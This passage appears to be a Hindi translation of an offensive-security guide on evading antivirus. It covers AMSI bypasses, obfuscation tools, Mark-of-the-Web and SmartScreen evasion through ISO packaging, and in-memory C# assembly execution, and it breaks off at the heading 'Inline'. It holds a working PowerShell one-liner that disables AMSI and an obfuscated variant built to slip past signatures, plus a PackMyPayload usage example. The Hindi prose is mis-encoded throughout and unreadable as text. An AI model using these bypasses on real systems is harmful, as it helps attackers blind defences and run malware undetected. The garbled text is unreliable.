рдХреНрдпреЛрдВрдХрд┐ AMSI рдХреЛ рдкрд╛рд╡рд░рд╢реЗрд▓ (рдЬреИрд╕реЗ cscript.exe, wscript.exe, рдЖрджрд┐) рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдПрдХ DLL рд▓реЛрдб рдХрд░рдХреЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЗрд╕реЗ рдЖрд╕рд╛рдиреА рд╕реЗ рдЙрд╕рдореЗрдВ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣рд╛рдВ рдПрдХ рдЕрдирдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреНрдб рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдЪрд▓ рд░рд╣рд╛ рд╣реИред рдЗрд╕ AMSI рдХреЗ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдореЗрдВ рджреЛрд╖ рдХреЗ рдХрд╛рд░рдг, рд╢реЛрдзрдХрд░реНрддрд╛рдУрдВ рдиреЗ AMSI рд╕реНрдХреИрдирд┐рдВрдЧ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЗ рдЦреЛрдЬреЗ рд╣реИрдВред

**рддреНрд░реБрдЯрд┐ рдХреЛ рдмрд▓ рдкреНрд░рджрд╛рди рдХрд░рдирд╛**

AMSI рдкреНрд░рд╛рд░рдВрднреАрдХрд░рдг рдХреЛ рд╡рд┐рдлрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП (amsiInitFailed) рдпрд╣ рдкрд░рд┐рдгрд╛рдо рд╣реЛрдЧрд╛ рдХрд┐ рд╡рд░реНрддрдорд╛рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рд╕реНрдХреИрди рдкреНрд░рд╛рд░рдВрдн рдирд╣реАрдВ рд╣реЛрдЧрд╛ред рдореВрд▓ рд░реВрдк рд╕реЗ рдЗрд╕реЗ [Matt Graeber](https://twitter.com/mattifestation) рдиреЗ рдЦреБрд▓рд╛рд╕рд╛ рдХрд┐рдпрд╛ рдерд╛ рдФрд░ рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдиреЗ рдЗрд╕рдХрд╛ рд╡реНрдпрд╛рдкрдХ рдЙрдкрдпреЛрдЧ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдпрд╛ рд╣реИред

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

рдХреЗрд╡рд▓ рдПрдХ рдкрдВрдХреНрддрд┐ рдкрд╛рд╡рд░рд╢реЗрд▓ рдХреЛрдб рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереА рддрд╛рдХрд┐ рд╡рд░реНрддрдорд╛рди рдкрд╛рд╡рд░рд╢реЗрд▓ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП AMSI рдЕрдкреНрд░рдпреЛрдЧреНрдп рд╣реЛ рдЬрд╛рдПред рдпрд╣ рдкрдВрдХреНрддрд┐ рдмреЗрд╢рдХ AMSI рджреНрд╡рд╛рд░рд╛ рдлреНрд▓реИрдЧ рдХреА рдЧрдИ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд╕рдВрд╢реЛрдзрди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

рдпрд╣рд╛рдБ рдПрдХ рд╕рдВрд╢реЛрдзрд┐рдд AMSI рдмрд╛рдИрдкрд╛рд╕ рд╣реИ рдЬрд┐рд╕реЗ рдореИрдВрдиреЗ рдЗрд╕ [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) рд╕реЗ рд▓рд┐рдпрд╛ рд╣реИред
```powershell
Try{#Ams1 bypass technic n┬║ 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.M├В┬гn├В┬гg' + 'e@+nt.Auto@' + '├В┬гtion.A' -join ''
$fdx = '@ms' + '├В┬гIn├В┬г' + 'tF@├В┬г' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('├В┬г','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('├В┬г','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**рдореЗрдореЛрд░реА рдкреИрдЪрд┐рдВрдЧ**

рдпрд╣ рддрдХрдиреАрдХ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА [@RastaMouse](https://twitter.com/\_RastaMouse/) рджреНрд╡рд╛рд░рд╛ рдЦреЛрдЬреА рдЧрдИ рдереА рдФрд░ рдЗрд╕рдореЗрдВ "AmsiScanBuffer" рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдкрддреЗ рдХреЛ amsi.dll рдореЗрдВ рдЦреЛрдЬрдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ (рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рдЗрдирдкреБрдЯ рдХреА рд╕реНрдХреИрдирд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдЬрд┐рдореНрдореЗрджрд╛рд░ рд╣реИ) рдФрд░ рдЗрд╕реЗ рдЗрдВрд╕реНрдЯреНрд░рдХреНрд╢рди рдХреЗ рд╕рд╛рде рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░рдирд╛ рдЬрд┐рд╕рд╕реЗ рдХреЛрдб рдХреЛ E\_INVALIDARG рдХреЗ рд▓рд┐рдП рд╡рд╛рдкрд╕ рд▓реМрдЯрд╛рдиреЗ рдХреЗ рдирд┐рд░реНрджреЗрд╢ рджрд┐рдП рдЬрд╛рдПрдВ, рдЗрд╕ рддрд░рд╣, рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕реНрдХреИрди рдХрд╛ рдкрд░рд┐рдгрд╛рдо 0 рд▓реМрдЯреЗрдЧрд╛, рдЬрд┐рд╕реЗ рд╕рд╛рдл рдкрд░рд┐рдгрд╛рдо рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

{% hint style="info" %}
рдХреГрдкрдпрд╛ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреЗ рд▓рд┐рдП [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) рдкрдврд╝реЗрдВред
{% endhint %}

AMSI рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рднреА рдХрдИ рддрдХрдиреАрдХреЗрдВ рд╣реИрдВ рдЬреЛ рдкрд╛рд╡рд░рд╢реЗрд▓ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИрдВ, [**рдЗрд╕ рдкреЗрдЬ**](basic-powershell-for-pentesters/#amsi-bypass) рдФрд░ [рдЗрд╕ рд░реЗрдкреЛ](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ рдФрд░ рдЙрдирдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдиреЗрдВред

рдпрд╛ рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЬреЛ рдореЗрдореЛрд░реА рдкреИрдЪрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣рд░ рдирдП рдкрд╛рд╡рд░рд╢реЗрд▓ рдХреЛ рдкреИрдЪ рдХрд░реЗрдЧрд╛ред

## рдЕрд╡рдЧреБрдгрди

рдХрдИ рдЙрдкрдХрд░рдг рд╣реИрдВ рдЬреЛ рдХреНрд▓рд┐рдпрд░-рдЯреЗрдХреНрд╕реНрдЯ рдХреЛ **рдЕрд╡рдЧреБрдгрд┐рдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, **рдореЗрдЯрд╛рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рдЯреЗрдореНрдкрд▓реЗрдЯ** рдЬреЗрдирд░реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддрдерд╛ рдмрд╛рдЗрдирд░реА рдХреЛ **рдЕрд╡рдЧреБрдгрд┐рдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЬреИрд╕реЗ:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# рдЕрд╡рдЧреБрдгрдХ**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): рдЗрд╕ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп [LLVM](http://www.llvm.org/) рд╕рдВрдХрд▓рди рд╕реБрдЗрдЯ рдХрд╛ рдПрдХ рдУрдкрди-рд╕реЛрд░реНрд╕ рдлреЛрд░реНрдХ рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рд╣реИ рдЬреЛ [рдХреЛрдб рдЕрд╡рдЧреБрдгрди](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) рдФрд░ рдЯреИрдореНрдкрд░-рдкреНрд░реВрдлрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡реГрджреНрдзрд┐ рджреЗрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛред
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ `C++11/14` рднрд╛рд╖рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреИрд╕реЗ рдХрдВрдкрд╛рдЗрд▓ рд╕рдордп рдкрд░ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдмрд╛рд╣реНрдп рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдФрд░ рдХрдВрдкрд╛рдЗрд▓рд░ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдП рдмрд┐рдирд╛ рдЕрд╡рдЧреБрдгрд┐рдд рдХреЛрдб рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* [**obfy**](https://github.com/fritzone/obfy): C++ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдЯрд╛рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рдлреНрд░реЗрдорд╡рд░реНрдХ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рдЕрд╡рдЧреБрдгрд┐рдд рдСрдкрд░реЗрд╢рди рдХреА рдПрдХ рдкрд░рдд рдЬреЛрдбрд╝реЗрдВ рдЬреЛ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рдХреНрд░реИрдХ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╡реНрдпрдХреНрддрд┐ рдХреЗ рдЬреАрд╡рди рдХреЛ рдереЛрдбрд╝рд╛ рд╕рд╛ рдХрдард┐рди рдмрдирд╛ рджреЗрдЧреАред
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz рдПрдХ x64 рдмрд╛рдЗрдирд░реА рдЕрд╡рдЧреБрдгрдХ рд╣реИ рдЬреЛ рд╡рд┐рднрд┐рдиреНрди рдкреАрдИ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЕрд╡рдЧреБрдгрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИ: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдореЗрдЯрд╛рдореЙрд░реНрдлрд┐рдХ рдХреЛрдб рдЗрдВрдЬрди рд╣реИ рдЬреЛ рд╡рд┐рднрд┐рдиреНрди рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рддреЛрдВ рдХреЗ рд▓рд┐рдП рд╣реИред
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator рдПрдХ рдлрд╛рдЗрди-рдЧреНрд░реЗрдиреНрдб рдХреЛрдб рдЕрд╡рдЧреБрдгрди рдлреНрд░реЗрдорд╡рд░реНрдХ рд╣реИ рдЬреЛ ROP (рд░рд┐рдЯрд░реНрди-рдУрд░рд┐рдПрдВрдЯреЗрдб рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ LLVM рд╕рдорд░реНрдерд┐рдд рднрд╛рд╖рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреЛ рдЕрд╡рдЧреБрдгрд┐рдд рдХрд░рддрд╛ рд╣реИред ROPfuscator рдПрдХ рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреЛ рдПрд╕реЗрдореНрдмрд▓реА рдХреЛрдб рд╕реНрддрд░ рдкрд░ рдЕрд╡рдЧреБрдгрд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╡рд╛рд╣ рдХреА рд╣рдорд╛рд░реА рдкреНрд░рд╛рдХреГрддрд┐рдХ рдзрд╛рд░рдгрд╛ рдХреЛ рдмрджрд▓рдХрд░ ROP рд╢реНрд░реГрдВрдЦрд▓рд╛рдУрдВ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рддрд╛ рд╣реИред
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt рдПрдХ .NET PE Crypter рд╣реИ рдЬреЛ Nim рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рд╣реИ
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor рдореМрдЬреВрджрд╛ EXE/DLL рдХреЛ рд╢реИрд▓рдХреЛрдб рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рдиреЗ рдФрд░ рдлрд┐рд░ рдЙрдиреНрд╣реЗрдВ рд▓реЛрдб рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИ

## рд╕реНрдорд╛рд░реНрдЯрд╕реНрдХреНрд░реАрди рдФрд░ MoTW

рдЖрдкрдиреЗ рд╢рд╛рдпрдж рдЗрд╕ рд╕реНрдХреНрд░реАрди рдХреЛ рджреЗрдЦрд╛ рд╣реЛрдЧрд╛ рдЬрдм рдЖрдк рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдХреБрдЫ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЪрд▓рд╛рддреЗ рд╣реИрдВред

рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдбрд┐рдлреЗрдВрдбрд░ рд╕реНрдорд╛рд░реНрдЯрд╕реНрдХреНрд░реАрди рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рддрдВрддреНрд░ рд╣реИ рдЬреЛ рдЕрдВрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреЛрдЯреЗрдВрд╢рд┐рдпрд▓реА рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЪрд▓рд╛рдиреЗ рд╕реЗ рдмрдЪрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИред

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

рд╕реНрдорд╛рд░реНрдЯрд╕реНрдХреНрд░реАрди рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдПрдХ рдкреНрд░рддрд┐рд╖реНрдард╛-рдЖрдзрд╛рд░рд┐рдд рджреГрд╖реНрдЯрд┐рдХреЛрдг рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЕрд░реНрдерд╛рдд рдЕрд╕рд╛рдорд╛рдиреНрдп рдбрд╛рдЙрдирд▓реЛрдб рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрдорд╛рд░реНрдЯрд╕реНрдХреНрд░реАрди рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВрдЧреЗ рдЬрд┐рд╕рд╕реЗ рдЕрдВрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЪрд▓рд╛рдиреЗ рд╕реЗ рд░реЛрдХрд╛ рдЬрд╛рдПрдЧрд╛ (рд╣рд╛рд▓рд╛рдВрдХрд┐ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдлрд┐рд░ рднреА рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА -> рдлрд┐рд░ рднреА рдЪрд▓рд╛рдПрдВ).

**MoTW** (Mark of The Web) рдПрдХ [NTFS рд╡реИрдХрд▓реНрдкрд┐рдХ рдбреЗрдЯрд╛ рд╕реНрдЯреНрд░реАрдо](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) рд╣реИ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо Zone.Identifier рд╣реИ рдЬреЛ рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдлрд╝рд╛рдЗрд▓реЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рддреЗ рд╕рдордп рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╕рд╛рде рд╣реА рдЙрд╕ URL рдХреЗ рд╕рд╛рде рдЬрд┐рд╕рд╕реЗ рдпрд╣ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП Zone.Identifier ADS рдХреА рдЬрд╛рдБрдЪред</p></figcaption></figure>

{% hint style="info" %}
рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ **рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп** рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХреЗ рд╕рд╛рде рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ **рд╕реНрдорд╛рд░реНрдЯрд╕реНрдХреНрд░реАрди рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдирд╣реАрдВ рдХрд░реЗрдЧрд╛**ред
{% endhint %}

рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдХреЛ Mark of The Web рд╕реЗ рдмрдЪрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд░рднрд╛рд╡реА рддрд░реАрдХрд╛ рдЙрдиреНрд╣реЗрдВ рдХрд┐рд╕реА рдкреНрд░рдХрд╛рд░ рдХреЗ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдкреИрдХреЗрдЬ рдХрд░рдирд╛ рд╣реИ рдЬреИрд╕реЗ рдХрд┐ рдПрдХ ISOред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ Mark-of-the-Web (MOTW) **non NTFS** рд╡реЙрд▓реНрдпреВрдо рдкрд░ рд▓рд╛рдЧреВ **рдирд╣реАрдВ** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ рдкреЗрд▓реЛрдб рдХреЛ рдорд╛рд░реНрдХ рдСрдл рдж рд╡реЗрдм рд╕реЗ рдмрдЪрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдЙрдЯрдкреБрдЯ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдкреИрдХреЗрдЬ рдХрд░рддрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдЙрдкрдпреЛрдЧ:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
рдпрд╣рд╛рдБ рдПрдХ рдбреЗрдореЛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ ISO рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ payloads рдХреЛ SmartScreen рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рджрд░реНрд╢рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# Assembly Reflection

рдореЗрдореЛрд░реА рдореЗрдВ C# binaries рд▓реЛрдб рдХрд░рдирд╛ рдХрд╛рдлреА рд╕рдордп рд╕реЗ рдЬрд╛рдирд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдФрд░ рдпрд╣ рдЖрдкрдХреЗ post-exploitation tools рдХреЛ AV рджреНрд╡рд╛рд░рд╛ рдкрдХрдбрд╝реЗ рдЬрд╛рдиреЗ рд╕реЗ рдмрдЪрд╛рдиреЗ рдХрд╛ рдПрдХ рдмрд╣реБрдд рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИред

рдкреЗрд▓реЛрдб рд╕реАрдзреЗ рдореЗрдореЛрд░реА рдореЗрдВ рд▓реЛрдб рд╣реЛ рдЬрд╛рдПрдЧрд╛ рдмрд┐рдирд╛ рдбрд┐рд╕реНрдХ рдХреЛ рдЫреВрддреЗ, рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ рдХреЗрд╡рд▓ AMSI рдХреЛ рдкреВрд░реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рдкреИрдЪ рдХрд░рдиреЗ рдХреА рдЪрд┐рдВрддрд╛ рдХрд░рдиреА рд╣реЛрдЧреАред

рдЕрдзрд┐рдХрд╛рдВрд╢ C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, рдЖрджрд┐) рдкрд╣рд▓реЗ рд╕реЗ рд╣реА C# assemblies рдХреЛ рдореЗрдореЛрд░реА рдореЗрдВ рд╕реАрдзреЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рд╣реИрдВ:

* **Fork\&Run**

рдЗрд╕рдореЗрдВ **рдПрдХ рдирдпрд╛ рдмрд▓рд┐рджрд╛рдиреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛** рд╢рд╛рдорд┐рд▓ рд╣реИ, рдЕрдкрдиреЗ post-exploitation рджреБрд░реБрдкрдпреЛрдЧреА рдХреЛрдб рдХреЛ рдЙрд╕ рдирдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдирд╛, рдЕрдкрдиреЗ рджреБрд░реБрдкрдпреЛрдЧреА рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рдФрд░ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдкрд░, рдирдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдорд╛рд░рдирд╛ред рдЗрд╕рдХреЗ рдлрд╛рдпрджреЗ рдФрд░ рдиреБрдХрд╕рд╛рди рджреЛрдиреЛрдВ рд╣реИрдВред рдлреЛрд░реНрдХ рдФрд░ рд░рди рд╡рд┐рдзрд┐ рдХрд╛ рд▓рд╛рдн рдпрд╣ рд╣реИ рдХрд┐ рдирд┐рд╖реНрдкрд╛рджрди рд╣рдорд╛рд░реЗ рдмреАрдХрди рдЗрдореНрдкреНрд▓рд╛рдВрдЯ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ **рдмрд╛рд╣рд░** рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрджрд┐ рд╣рдорд╛рд░реЗ post-exploitation рдХрд╛рд░реНрд░рд╡рд╛рдИ рдореЗрдВ рдХреБрдЫ рдЧрд▓рдд рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ рдпрд╛ рдкрдХрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╣рдорд╛рд░реЗ **рдЗрдореНрдкреНрд▓рд╛рдВрдЯ рдХреЗ рдЬреАрд╡рд┐рдд рд░рд╣рдиреЗ** рдХреА **рдЕрдзрд┐рдХ рд╕рдВрднрд╛рд╡рдирд╛** рд╣реИред рдиреБрдХрд╕рд╛рди рдпрд╣ рд╣реИ рдХрд┐ рдЖрдкрдХреЛ **рд╡реНрдпрд╡рд╣рд╛рд░рд┐рдХ рдкрд╣рдЪрд╛рди** рджреНрд╡рд╛рд░рд╛ рдкрдХрдбрд╝рдиреЗ рдХреА **рдЕрдзрд┐рдХ рд╕рдВрднрд╛рд╡рдирд╛** рд╣реИред

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

